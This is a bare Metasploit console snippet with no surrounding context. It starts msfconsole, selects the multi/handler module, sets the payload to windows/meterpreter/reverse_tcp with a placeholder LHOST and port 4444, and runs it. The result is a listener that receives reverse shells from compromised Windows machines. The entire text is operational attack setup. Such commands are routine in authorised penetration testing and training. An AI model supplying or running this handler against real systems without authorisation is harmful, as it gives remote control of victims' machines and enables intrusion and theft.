msfconsole
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST <your_ip>
    set LPORT 4444
    exploit